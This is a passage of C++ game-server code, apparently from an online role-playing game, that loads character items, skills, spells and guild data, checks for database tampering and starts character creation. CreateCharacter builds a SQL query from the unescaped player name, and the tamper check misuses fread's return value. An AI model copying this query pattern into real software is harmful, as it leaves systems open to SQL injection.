               if(theApp.m_dwMinionGemID >0 && !bHaveGemofMinion)
               {
                  Objects *objGemObject = new Objects;
                  if( objGemObject->Create( U_OBJECT, theApp.m_dwMinionGemID ) )
                     AddToBackpack( objGemObject );
                  else
                     objGemObject->DeleteUnit();
               }
            }
            ODBCCharRead.Cancel(); //Cancel Previous fetch
         }


         TFCPacket sending;
         packet_equiped( sending );
         SendPlayerMessage( sending );

         // Now that all 'gold' items have been loaded, set the true gold.
         SetGold( dwGold, false );

         // LOAD CHARACTER CHEST ITEMS
         {				
            DWORD dwTempID;
            const int DB_ObjID    =		1;				
            const int DB_EquipPos =		2;
            const int DB_ObjType  =		3;
            const int DB_Qty      =    4;
            const int DB_MadeBy   =    5;

            LOADED_ITEM *lpLoadedItem;

            // Temporary list which will contain the loaded items.				
            TemplateList < LOADED_ITEM > tlLoadedItems;

            csQuery.Format( "SELECT ObjID, 0, ObjType, Qty, MadeBy FROM ChestItems WHERE OwnerID=%u", GetID() );
            if( ODBCCharRead.SendRequest( (LPCTSTR)csQuery ) )
            {
               // Scroll through all fetched records.
               while( ODBCCharRead.Fetch() )
               {
                  lpLoadedItem = new LOADED_ITEM;

                  ODBCCharRead.GetDWORD ( DB_ObjID,    &lpLoadedItem->dwObjID );
                  lpLoadedItem->bEquipPos = 0;
                  ODBCCharRead.GetString( DB_ObjType,  (LPTSTR)lpLoadedItem->lpszObjType, 50 );
                  ODBCCharRead.GetDWORD ( DB_Qty,      &lpLoadedItem->dwQty );
                  if( lpLoadedItem->dwQty == 0 )
                  {
                     lpLoadedItem->dwQty = 1;
                  }
                  
                  memset(lpLoadedItem->lpszMadeBy     ,0x00,50);
                  ODBCCharRead.GetString( DB_MadeBy,  (LPTSTR)lpLoadedItem->lpszMadeBy, 50 );

                  // Add them to the loaded items list.
                  tlLoadedItems.AddToTail( lpLoadedItem );
                  iNbrChestItemCount++;
               }
               ODBCCharRead.Cancel(); //Cancel Previous fetch

               // Scroll through the loaded items
               tlLoadedItems.ToHead();
               while( tlLoadedItems.QueryNext() )
               {
                  lpLoadedItem = tlLoadedItems.Object();

                  Objects *lpuItem = new Objects();

                  // If object could be created
                  if( lpuItem->Create( U_OBJECT, Unit::GetIDFromName( lpLoadedItem->lpszObjType, U_OBJECT, TRUE ) ) )
                  {

                     // Temporarly replace the unit's ID to load its flags, boosts and effects
                     dwTempID = lpuItem->GetID();
                     lpuItem->SetID( lpLoadedItem->dwObjID );

                     lpuItem->SetQty( lpLoadedItem->dwQty );
                     if(lpLoadedItem->lpszMadeBy)
                        lpuItem->SetCreatedBy( (char*)lpLoadedItem->lpszMadeBy);
                     else
                        lpuItem->SetCreatedBy("");

                     _item *itemStructure = NULL;

                     lpuItem->SendUnitMessage( MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &itemStructure );

                     int chargeValue = 0;
                     if( itemStructure != NULL && itemStructure->magic.charges < 0 )
                     {
                        chargeValue = -1;
                     }

                     // Flush the object's CHARGE flag created by ObjectStructure
                     // If the object has flags, they will be loaded.
                     lpuItem->SetFlag( __FLAG_CHARGES, chargeValue );

                     //LOAD CHARACTER CHEST ITEMS FLAGS
                     lpuItem->LoadFlags( ODBCCharRead, GetID() );	 //chest flags						
                     ODBCCharRead.Cancel(); //Cancel Previous fetch

                     // If the item is not unique, set its charge to 1 since
                     // it wasn't saved to avoid cluttering the database.
                     if( !lpuItem->IsUnique() )
                     {
                        lpuItem->SetFlag( __FLAG_CHARGES, 1 );
                     }

                     // Reset the item's ID to its newly assigned one.
                     lpuItem->SetID( dwTempID );

                     //Put item into chest.
                     chest->Put( lpuItem, true );
                  }
                  else
                  {
                     lpuItem->DeleteUnit();
                  }
                  tlLoadedItems.DeleteAbsolute();
               }
            }
            ODBCCharRead.Cancel(); //Cancel Previous fetch
         }

         // LOAD CHARACTER SKILLS
         {
            const int DB_SkillID		= 1;
            const int DB_SKSkillPnts	= 2;

            csQuery.Format( "SELECT SkillID, SkillPnts FROM PlayerSkills WHERE OwnerID=%u ORDER BY SkillID", GetID() );
            if( ODBCCharRead.SendRequest( (LPCTSTR)csQuery ) )
            {
               // Scroll through all fetched records.
               while( ODBCCharRead.Fetch() )
               {																		
                  WORD wSkillID = 0;
                  WORD wSkillPnts = 0;
                  WORD wSkillPntsBackup = wNbSkillPnts;

                  // Fetch skill data.
                  ODBCCharRead.GetWORD( DB_SkillID, &wSkillID );
                  ODBCCharRead.GetWORD( DB_SKSkillPnts, &wSkillPnts );

                  // Give the maximum skill points to make sure the loaded skill is learned.
                  wNbSkillPnts = 0xFFFF;
                  CString errMsg;
                  LPUSER_SKILL lpusUserSkill = LearnSkill( wSkillID, wSkillPnts, false, errMsg );

                  // If skill could be trained.
                  if( lpusUserSkill )
                  {
                     lpusUserSkill->SetSkillPnts( wSkillPnts );
                  }

                  if( lpusUserSkill == NULL )
                  {
                     //ne log pas les 2 skill ajouter par defaut via serveur pour rien
                     if(wSkillID != 9 && wSkillID !=10)
                     {
                        _LOG_DEBUG
                           LOG_DEBUG_LVL1,
                           "Character %s (ID %u) could NOT load skill %u with %u pnts! ErrMsg=%s",
                           (LPCTSTR)GetName( _DEFAULT_LNG ),
                           GetID(),
                           wSkillID,
                           wSkillPnts,
                           (LPCTSTR)errMsg
                           LOG_
                     }
                     
                  }

                  // Restore skill points.
                  wNbSkillPnts = wSkillPntsBackup;
               }
            }
            if(theApp.dwEquilibrageNewSkillEnable == 0)
            {
               LPUSER_SKILL lpUserSkill = GetSkill( __SKILL_ARCHERY );
               // If the user does not have the archery skill
               if( lpUserSkill == NULL )
               {
                  CString errMsg;
                  WORD wSkillPntsBackup = wNbSkillPnts;
                  wNbSkillPnts = 0xFFFF;
                  // Learn the archery skill at 15 points.
                  LPUSER_SKILL lpusUserSkill = LearnSkill( __SKILL_ARCHERY, 15, false, errMsg );
                  // If skill could be trained.
                  if( lpusUserSkill )
                  {
                     // cheat a little.. j/k, set skill points.
                     lpusUserSkill->SetSkillPnts( 15 );
                  }
                  else
                  {
                     _LOG_DEBUG
                        LOG_CRIT_ERRORS,
                        "Character %s (ID %u) could NOT create archery skill! ErrMsg=%s",
                        (LPCTSTR)GetName( _DEFAULT_LNG ),
                        GetID(),
                        (LPCTSTR)errMsg
                        LOG_
                  }
                  wNbSkillPnts = wSkillPntsBackup;
               }
            }
            else
            {
               DWORD requiredSkill[] = 
               {
                  __SKILL_ARCHERY,
                  __SKILL_CRITICAL_STRIKE
               };


               // For each required skill
               for ( int iSkillId =0; iSkillId< (sizeof(requiredSkill) / sizeof(DWORD)); iSkillId++) 
               {
                  LPUSER_SKILL lpUserSkill = GetSkill( requiredSkill[iSkillId] );
                  // If the user does not have the archery skill
                  if( lpUserSkill == NULL )
                  {
                     CString errMsg;
                     WORD wSkillPntsBackup = wNbSkillPnts;
                     wNbSkillPnts = 0xFFFF;
                     // Learn the archery skill at 15 points.
                     LPUSER_SKILL lpusUserSkill = LearnSkill( requiredSkill[iSkillId] , 15, false, errMsg );
                     // If skill could be trained.
                     if( lpusUserSkill )
                     {
                        // cheat a little.. j/k, set skill points.
                        lpusUserSkill->SetSkillPnts( 15 );
                     }
                     else
                     {
                        _LOG_DEBUG
                           LOG_CRIT_ERRORS,
                           "Character %s (ID %u) could NOT create required skill %d! ErrMsg=%s",
                           (LPCTSTR)GetName( _DEFAULT_LNG ),
                           GetID(),
                           requiredSkill[iSkillId],
                           (LPCTSTR)errMsg
                           LOG_
                     }
                     wNbSkillPnts = wSkillPntsBackup;
                  }
               }
            }
            ODBCCharRead.Cancel(); //Cancel Previous fetch
         }

         

         // LOAD CHARACTER SPELL
         {
            const int DB_SpellID	= 1;
            const int DB_SpellPnts	= 2;

            LPUSER_SKILL lpSkill;

            // Flush current spell list.
            tlusSpells.ToHead();
            while( tlusSpells.QueryNext() )
               tlusSpells.DeleteAbsolute();

            csQuery.Format( "SELECT SpellID FROM PlayerSpells WHERE OwnerID=%u", GetID() );

            if( ODBCCharRead.SendRequest( (LPCTSTR)csQuery ) )
            {			

               #ifdef BUILD_NMS_CUSTOM_NPC
                  DWORD dwResetSpellID = ViewFlag(__FLAG_MAJ01_CREDIT_SPELL);
               #endif

               // Scroll through all fetched records.
               while( ODBCCharRead.Fetch() )
               {																		
                  lpSkill = new USER_SKILL;
                  ZeroMemory( lpSkill, sizeof( USER_SKILL ) );

                  DWORD dwSkillID = 0;
                  ODBCCharRead.GetDWORD( DB_SpellID, &dwSkillID );
                  lpSkill->SetSkillPnts( 0 );
                  lpSkill->SetSkillID  ( dwSkillID );
                  
                  #ifdef BUILD_NMS_CUSTOM_NPC
                     if(dwResetSpellID == 0)
                     {
                        if(dwSkillID == 10148)//sanctuaire
                        {
                           wNbSkillPnts+=33;
                           SetGold(GetGold()+99632,false);
                        }
                        else if(dwSkillID == 10154)//résistance au feu
                        {
                           wNbSkillPnts+=19;
                           SetGold(GetGold()+69617,false);
                        }
                        else if(dwSkillID == 10170)// résistance à la glace
                        {
                           wNbSkillPnts+=20;
                           SetGold(GetGold()+79028,false);
                        }
                        else if(dwSkillID == 10150)//enchevêtrement
                        {
                           wNbSkillPnts+=15;
                           SetGold(GetGold()+37319,false);
                        }
                        else if(dwSkillID == 11067)//Foudroiement
                        {
                           wNbSkillPnts+=37;
                           SetGold(GetGold()+336532,false);
                        }
                        else
                        {
                           tlusSpells.AddToTail( lpSkill );
                           iNbrSpellCount++;
                        }
                     }
                     else if(dwResetSpellID == 1)
                     {
                        if(dwSkillID == 11602)//Volcano
                        {
                           wNbSkillPnts+=44;
                           SetGold(GetGold()+614828,false);
                        }
                        else if(dwSkillID == 11603)//Gelures
                        {
                           wNbSkillPnts+=42;
                           SetGold(GetGold()+682694,false);
                        }
                        else if(dwSkillID == 11067)// Foudroiement
                        {
                           wNbSkillPnts+=37;
                           SetGold(GetGold()+336532,false);
                        }
                        else if(dwSkillID == 10852)//Racines vénéneuses
                        {
                           wNbSkillPnts+=50;
                           SetGold(GetGold()+799000,false);
                        }
                        else if(dwSkillID == 11739)//Lame de sable
                        {
                           wNbSkillPnts+=23;
                           SetGold(GetGold()+478266,false);
                        }
                        else
                        {
                           tlusSpells.AddToTail( lpSkill );
                           iNbrSpellCount++;
                        }
                     }
                     else
                     {
                        tlusSpells.AddToTail( lpSkill );
                        iNbrSpellCount++;
                     }
                  
                  #else
                     tlusSpells.AddToTail( lpSkill );
                     iNbrSpellCount++;
                  #endif
               }

               #ifdef BUILD_NMS_CUSTOM_NPC
                  if(dwResetSpellID == 0)
                     SetFlag(__FLAG_MAJ01_CREDIT_SPELL,1);
                  else if(dwResetSpellID == 1)
                     SetFlag(__FLAG_MAJ01_CREDIT_SPELL,2);
               #endif
            }
            ODBCCharRead.Cancel(); //Cancel Previous fetch
         }

         // LOAD CHARACTER FORMULA
         {
            const int DB_FormuleID  	= 1;

            LPUSER_PROFESSION_F lpFormula;

            // Flush current spell list.
            tlProfessionAcq.ToHead();
            while( tlProfessionAcq.QueryNext() )
               tlProfessionAcq.DeleteAbsolute();
            csQuery.Format( "SELECT FormuleID FROM PlayerProfession WHERE OwnerID=%u ORDER by FormuleID", GetID() );
            if( ODBCCharRead.SendRequest( (LPCTSTR)csQuery ) )
            {			
               // Scroll through all fetched records.
               while( ODBCCharRead.Fetch() )
               {																		
                  lpFormula = new USER_PROFESSION_F;
                  lpFormula->ushID = 0;
                  DWORD dwTmp;
                  ODBCCharRead.GetDWORD( DB_FormuleID, &dwTmp );
                  lpFormula->ushID = dwTmp;

                  tlProfessionAcq.ToHead();
                  BOOL bAdd = FALSE;
                  while(tlProfessionAcq.QueryNext() && !bAdd)
                  {
                     LPUSER_PROFESSION_F lpCurrent = tlProfessionAcq.Object();
                     if(lpFormula->ushID < Professions::GetFormuleSkill(lpCurrent->ushID))
                     {
                        tlProfessionAcq.AddToPrevious(lpFormula);
                        bAdd = TRUE;
                     }
                  }
                  if(!bAdd)
                     tlProfessionAcq.AddToTail( lpFormula );
               }
            }
            ODBCCharRead.Cancel(); //Cancel Previous fetch
         }
        

         // LOAD CHARACTER SPELL EFFECTS
         LoadEffects( ODBCCharRead, GetID() );
         ODBCCharRead.Cancel(); //Cancel Previous fetch

         // LOAD CHARACTER BOOSTS
         LoadBoosts( ODBCCharRead, GetID());
         ODBCCharRead.Cancel(); //Cancel Previous fetch
         ODBCCharRead.Unlock();

         Players *pl = (Players *)ThisPlayer;
         ChatterChannels &cChatter = CPlayerManager::GetChatter();
         //cChatter.Remove(pl);

         //Load Guild Information...
         char  lpszGuildName [ 50 ];
         char  lpszlastPlayerName [ 50 ];
         sprintf_s(lpszGuildName,50,"");
         DWORD dwTitle      = 0;
         DWORD dwPermission = 0;
         if(GuildMaster::GetUserGuildInfo(GetID(),(char*)lpszGuildName,(char*)lpszlastPlayerName,dwTitle,dwPermission))
         {
            //si la guild existe bien....
            SetGuildName(lpszGuildName);
            SetGuildTitle(dwTitle);
            SetGuildPermission(dwPermission);
         }

         //SetXP
         if(theApp.dwEquilibrageNewCourbeXPEnable != 0 && ViewFlag(__FLAG_CONVERTED_TO_NEW_XP_CHART) ==0)
         { 
            SetFlag(__FLAG_CONVERTED_TO_NEW_XP_CHART,1);

            //Set the new XP value to Char...
            int iPlayerLevel = GetLevel();
            if(iPlayerLevel >=MAX_LEVEL_XP-1)
            {
               SetXP(sm_n64XPchart[MAX_LEVEL_XP-1]);
            }
            else
            {
               //step 1...  recupere les xp au debut du level courant et du level suivant...
               __int64 iiOldXP     = GetXP();
               __int64 iiOXPLevel  = sm_n64XPchartOld[iPlayerLevel-1];
               __int64 iiOXPLevelN = sm_n64XPchartOld[iPlayerLevel];
               __int64 iiNXPLevel  = sm_n64XPchart[iPlayerLevel-1];
               __int64 iiNXPLevelN = sm_n64XPchart[iPlayerLevel];
               
               //Step 2...  Recupere le % de XP fait a ce level...
               __int64 iNbrXpDoneThisLevel = iiOldXP-iiOXPLevel;
               __int64 iNbrXPThisLevelOld     = iiOXPLevelN - iiOXPLevel;
               __int64 iXPDoneOldPC        = (iNbrXpDoneThisLevel *100) / iNbrXPThisLevelOld;

               //Step 3...  On calcule cb de XP fait ce % du vieux...
               __int64 iNbrXPThisLevelNew     = iiNXPLevelN - iiNXPLevel;
               __int64 iXPDoneNew             = (iNbrXPThisLevelNew * (iXPDoneOldPC+1)) / 100;

               //Step 4... On set les new Xp avec new table...
               SetXP(iiNXPLevel+iXPDoneNew);

               //Players *pl = static_cast< Players * >( GetPlayer() );
               

               _LOG_DEBUG
                  LOG_WARNING,
                  "*** XP Changed to new chart*** Character %s (%s) before %lf  now %lf",
                  GetTrueName(),
                  pl->GetFullAccountName(),
                  (double)iiOldXP,
                  (double)GetXP()
                  LOG_
            }
         }

         if(GetGuildName() != "")
         {
            theApp.AddGuildRequest(NULL,NULL,NULL,GUILD_LOAD_CHEST,0,0,0,0,GetGuildName(),"");
            
            //add le CC de la guild au USER...
            cChatter.AddCCPlayer( pl, GetGuildName().GetBuffer(0), "",false );

            if(strcmp(lpszGuildName,GetTrueName().GetBuffer(0))  != 0 )
            {
               //le user a changer de nom et est dans une guilde, on doit
               //on update son nom pour quand il sera offline...
               theApp.AddGuildRequest(this,NULL,NULL,GUILD_UPDATE_OFFLINE_NAME,GetID(),0,0,0,GetTrueName().GetBuffer(0),"");
            }
         }

         //ICI tout est loader on peu valider que les stat de base non pas ete modifier si loption est activer...
         if(theApp.sGeneral.dwServerBDExtModCheck == 1)
         {
            CString strPathBD;
            CString strExtBDFile;
            strExtBDFile.Format("%06d.bin",GetID());
            strPathBD = TFCMAIN::GetHomeDir();
            strPathBD += "EXTBD\\";
            //CreateDirectory( strPathBD, NULL ); //sera creer au save pas au read...
            strPathBD+=strExtBDFile;

            //on load le file si le fichier existe on load et compare les valeur
            FILE *pfBin = NULL;
            fopen_s(&pfBin,strPathBD,"rb");
            if(pfBin)
            {
               
               bool bCanCompare = false;
               EXTBDCheck newCheck;
               if(fread(&newCheck,sizeof(newCheck),1,pfBin) == sizeof(newCheck))
               {
                  bCanCompare = true;
               }
               fclose(pfBin);
               

               bool bParamBDChange = false;
               CString strChangeparam;
               strChangeparam = " ";

                
               if(abs(newCheck.wStr-GetTrueSTR()) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "STR, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                        "Player %s (%s) param STR change from database... old %d, new %d.",
                        GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wStr,GetTrueSTR()
                     LOG_
               }
               if(abs(newCheck.wEnd-GetTrueEND()) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "END, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                        "Player %s (%s) param END change from database... old %d, new %d.",
                        GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wEnd,GetTrueEND()
                     LOG_
               }
               if(abs(newCheck.wAgi-GetTrueAGI()) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "AGI, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param AGI change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wAgi,GetTrueAGI()
                     LOG_
               }
               if(abs(newCheck.wInt-GetTrueINT()) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "INT, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param INT change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wInt,GetTrueINT()
                     LOG_
               }
               if(abs(newCheck.wWis-GetTrueWIS()) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "WIS, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param WIS change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wWis,GetTrueWIS()
                     LOG_
               }

               if(abs(newCheck.wStP-wNbStatPnts) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "StatPoints, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param StatPoints change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wStP,wNbStatPnts
                     LOG_
               }
               if(abs(newCheck.wSkP-wNbSkillPnts) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "wNbSkillPnts, ";
                     _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param SkillPoints change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.wSkP,wNbSkillPnts
                     LOG_
               }
               if(fabs(newCheck.dXP-(double)GetXP()) > 2 )
               {
                  bParamBDChange = true;
                  strChangeparam += "XP, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param XP change from database... old %lf, new %lf.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.dXP,(double)GetXP()
                     LOG_
               }

               if(abs((long)newCheck.dwMaxHP-(long)GetTrueMaxHP()) > 100)
               {
                  bParamBDChange = true;
                  strChangeparam += "MAX HP, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param MAX HP change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.dwMaxHP,GetTrueMaxHP()
                     LOG_
               }
               if(abs((long)newCheck.dwMaxMP-(long)GetTrueMaxMana()) > 75)
               {
                  bParamBDChange = true;
                  strChangeparam += "MAX MP, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param MAX MP change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.dwMaxMP,GetTrueMaxMana()
                     LOG_
               }

               if(abs(newCheck.iGold-GetGold()) > 100000)
               {
                  bParamBDChange = true;
                  strChangeparam += "GOLD, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) param GOLD change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.iGold,GetGold()
                     LOG_
               }

               if(abs(newCheck.iNbrItem-iNbrItemCount) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "NBR ITEMS, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) NBR ITEMS change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.iNbrItem,iNbrItemCount
                     LOG_
               }

               if(abs(newCheck.iNbrChestItem-iNbrChestItemCount) > 5)
               {
                  bParamBDChange = true;
                  strChangeparam += "NBR CHEST ITEMS, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) NBR CHEST ITEMS change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.iNbrChestItem,iNbrChestItemCount
                     LOG_
               }

               if(abs(newCheck.iNbrSpell-iNbrSpellCount) > 2)
               {
                  bParamBDChange = true;
                  strChangeparam += "NBR SPELLS, ";
                  _LOG_BDEXTCH
                     LOG_ALWAYS,
                     "Player %s (%s) NBR SPELLS change from database... old %d, new %d.",
                     GetTrueName(),GetPlayer()->GetFullAccountName(),newCheck.iNbrSpell,iNbrSpellCount
                     LOG_
               }

               if(bParamBDChange)
               {
                  //envoie un GM Send en ligne de ici...
                  //CString strGMMsg;
                  //strGMMsg.Format("Player %s (%s) have << %s >> directly changed on database, possibly hack, ask HGM to verify logs.",GetTrueName(),GetPlayer()->GetFullAccountName(),strChangeparam);
               }
            }
         }


		



         BoostFormula bfChestEncumbrance;
         BOOL boFormulaHaveErrors = !(bfChestEncumbrance.SetFormula( theApp.csChestEncumbranceBoostFormula ));
         chest->SetMaxWeight( bfChestEncumbrance.GetBoost( this ) );

         if ( boFormulaHaveErrors ) 
         {
            _LOG_DEBUG
               LOG_CRIT_ERRORS,
               "Chest encumbrance formula have errors in it. Chest will have 0 encumbrance. Triggered while loading player %s (acct %s)",
               (LPCTSTR)csName,
               (LPCTSTR)lpszUserName
               LOG_
         }


         /*
		 if(ViewFlag(__FLAG_POISSON_AVRIL_ITEMS) == 0)
		 {
			SetFlag(__FLAG_POISSON_AVRIL_ITEMS,1);
			Objects *lpItem = new Objects;
			if( lpItem->Create( U_OBJECT, 45533 ) )
			{
				AddToBackpack( lpItem );
			}
			else
			{
				lpItem->DeleteUnit();
			}

		 }*/

         return 0;
      }
      else
      {
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "The user account %s tried to access character %s (property of account %s)",
            pl->GetAccount(),csName,lpszUserName
            LOG_

         ODBCCharRead.Cancel();
         ODBCCharRead.Unlock();
         return 10;
      }
   }

   ODBCCharRead.Cancel();
   ODBCCharRead.Unlock();
   return 6;
}
/******************************************************************************/
// Creates a new character, returns FALSE if it could not create a new character
BOOL Character::CreateCharacter(CString csName, LPBYTE lpbAnswers )
/******************************************************************************/
{

   Players *pl = (Players *)ThisPlayer;
   if( pl == NULL )
   {
      return FALSE;
   }

   csName.TrimRight();
   csName.TrimLeft();

   CString csQuery;

   csQuery.Format( "SELECT UserID FROM PlayingCharacters WHERE PlayerName='%s'", (LPCTSTR)csName );

   ODBCCharWrite.Lock();
   ODBCCharWrite.SendRequest( (LPCTSTR)csQuery );

   if( ODBCCharWrite.Fetch() )
   {
      ODBCCharWrite.Cancel();
      ODBCCharWrite.Unlock();
      return FALSE;// character already exists!
   }
   ODBCCharWrite.Cancel();
   ODBCCharWrite.Unlock();


   _LOG_PC
      LOG_MISC_1,
      "Created player '%s' for user %s.",
      (LPCTSTR)csName,
      (LPCTSTR)(pl->GetFullAccountName())
      LOG_

   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      backpack->Object()->DeleteUnit();
      backpack->Remove();
   }
   chest->ResetContainer();

   // Assigns a valid new ID to this character.
   AssignValidID( this );

   char szAccount[ 1024 ];
   Players::QuotedAccount( szAccount, pl->GetAccount() );

   SetLevel(1);
   SetName(csName);		
   Corpse = 1;

   nKarma = nCrime = nHonor = dwLastHealing = 0;

   
   Objects *objNewObject = new Objects; // Create a gem of destiny, its a *must*
   if( objNewObject->Create( U_OBJECT, __OBJ_GEM_OF_DESTINY ) )
      backpack->AddToTail( objNewObject );
   else
      objNewObject->DeleteUnit();

   if(theApp.m_dwMinionGemID >0) //Creage Minion gem si elle existe en settings...
   {
      Objects *objGemObject = new Objects;
      if( objGemObject->Create( U_OBJECT, theApp.m_dwMinionGemID ) )
         backpack->AddToTail( objGemObject );
      else
         objGemObject->DeleteUnit();
   }

   // Create all startup items on player.
   WORD wObjID;            
   vector< string >::iterator k;
   vStartupItems.Lock();
   for( k = vStartupItems.begin(); k != vStartupItems.end(); k++ )
   {
      // If the object's numerical ID could be found.
      wObjID = Unit::GetIDFromName( (*k).c_str(), U_OBJECT, TRUE );
      if( wObjID != 0 )
      {
         objNewObject = new Objects;
         // Create this object.
         if( objNewObject->Create( U_OBJECT, wObjID ) )
         {
            backpack->AddToTail( objNewObject );
         }
         else
         {
            objNewObject->DeleteUnit();
         }
      }
   }
   vStartupItems.Unlock();

   WORD wSkillPntsBackup = wNbSkillPnts;
   CString errMsg;
   wNbSkillPnts = 0xFFFF;

   if(theApp.dwEquilibrageNewSkillEnable == 0)
   {
      LPUSER_SKILL lpusUserSkill = LearnSkill( __SKILL_ARCHERY, 15, false, errMsg );
      if( lpusUserSkill )
         lpusUserSkill->SetSkillPnts( 15 );
   }
   else
   {
      DWORD requiredSkill[] = 
      {
         __SKILL_ARCHERY,
         __SKILL_CRITICAL_STRIKE
      };


      // For each required skill
      for ( int iSkillId =0; iSkillId< (sizeof(requiredSkill) / sizeof(DWORD)); iSkillId++) 
      {
         LPUSER_SKILL lpusUserSkill = LearnSkill( requiredSkill[iSkillId], 15, false, errMsg );
         if( lpusUserSkill ) 
            lpusUserSkill->SetSkillPnts( 15 );
      }
   }

   wNbSkillPnts = wSkillPntsBackup;

   const int Warrior     = 0;  
   const int Mage        = 1;  
   const int Thief       = 2;  
   const int Priest      = 3;  
   const int Normal      = 4;            
   const int NbQuestions = 4;

   int i;
   int nPnts = 0;

   SetLightResist( 5000 ); // Since our players are way far from undeads.
   for( i = 0; i < 5; i++ )
       nPnts += lpbAnswers[ i ];
 
   if( nPnts == NbQuestions )
   {                                
      nPnts = lpbAnswers[ 0 ];
      for( i = 1; i < 5; i++ )
      {
         if( lpbAnswers[ i ] > nPnts )
         {                        
            Appearance = i;
            nPnts = lpbAnswers[ i ];
         }
      }

      if( lpbAnswers[ 5 ] == GENDER_FEMALE )
      {
         SetGender( GENDER_FEMALE );
         Appearance = __PLAYER_FEMALE_PUPPET;
      }
      else
      {
         SetGender( GENDER_MALE );
         Appearance = __PLAYER_PUPPET;
      }

      TRACE( "\r\nOfficial appearance should be %u.", Appearance );                

      bRollSTR = 0;
      bRollEND = 0;
      bRollINT = 0;
      bRollAGI = 0;    
      bRollWIL = 0;
      bRollWIS = 0;
      bRollLCK = 0;        

      // Set default (bonus) stats.
      for( i = 0; i < 5; i++ )
      {
         nPnts = lpbAnswers[ i ];
         switch( i )
         {
            case Warrior:
               bRollSTR += static_cast< DWORD >( 3.5 * nPnts );
               bRollAGI += static_cast< DWORD >( 1.5 * nPnts );
               bRollEND += static_cast< DWORD >( 3.5 * nPnts );
               bRollINT += static_cast< DWORD >( 0.5 * nPnts );
               bRollWIS += static_cast< DWORD >( 0.5 * nPnts );
               bRollWIL += static_cast< DWORD >( 1.5 * nPnts );
               bRollLCK += static_cast< DWORD >( 1.5 * nPnts );
            break;
            case Mage:
               bRollSTR += static_cast< DWORD >( 0.5 * nPnts );
               bRollAGI += static_cast< DWORD >( 1.5 * nPnts );
               bRollEND += static_cast< DWORD >( 0.5 * nPnts );
               bRollINT += static_cast< DWORD >( 3.5 * nPnts );
               bRollWIS += static_cast< DWORD >( 1.5 * nPnts );
               bRollWIL += static_cast< DWORD >( 3.5 * nPnts );
               bRollLCK += static_cast< DWORD >( 1.5 * nPnts );
            break;
            case Thief:
               bRollSTR += static_cast< DWORD >( 3.5 * nPnts );
               bRollAGI += static_cast< DWORD >( 3.5 * nPnts );
               bRollEND += static_cast< DWORD >( 1.5 * nPnts );
               bRollINT += static_cast< DWORD >( 1.5 * nPnts );
               bRollWIS += static_cast< DWORD >( 0.5 * nPnts );
               bRollWIL += static_cast< DWORD >( 0.5 * nPnts );
               bRollLCK += static_cast< DWORD >( 2.0 * nPnts );
            break;
            case Priest:
               bRollSTR += static_cast< DWORD >( 1.5 * nPnts );
               bRollAGI += static_cast< DWORD >( 0.5 * nPnts );
               bRollEND += static_cast< DWORD >( 1.5 * nPnts );
               bRollINT += static_cast< DWORD >( 1.5 * nPnts );
               bRollWIS += static_cast< DWORD >( 3.5 * nPnts );
               bRollWIL += static_cast< DWORD >( 3.5 * nPnts );
               bRollLCK += static_cast< DWORD >( 0.5 * nPnts );
            break;
            case Normal:
               bRollSTR += static_cast< DWORD >( 1.5 * nPnts );
               bRollAGI += static_cast< DWORD >( 1.5 * nPnts );
               bRollEND += static_cast< DWORD >( 1.5 * nPnts );
               bRollINT += static_cast< DWORD >( 1.5 * nPnts );
               bRollWIS += static_cast< DWORD >( 1.5 * nPnts );
               bRollWIL += static_cast< DWORD >( 1.5 * nPnts );
               bRollLCK += static_cast< DWORD >( 3.5 * nPnts );
            break;
         }
      }
   }
   else
   {
      bRollSTR += static_cast< DWORD >( 1.5 * nPnts );
      bRollAGI += static_cast< DWORD >( 1.5 * nPnts );
      bRollEND += static_cast< DWORD >( 1.5 * nPnts );
      bRollINT += static_cast< DWORD >( 1.5 * nPnts );
      bRollWIS += static_cast< DWORD >( 1.5 * nPnts );
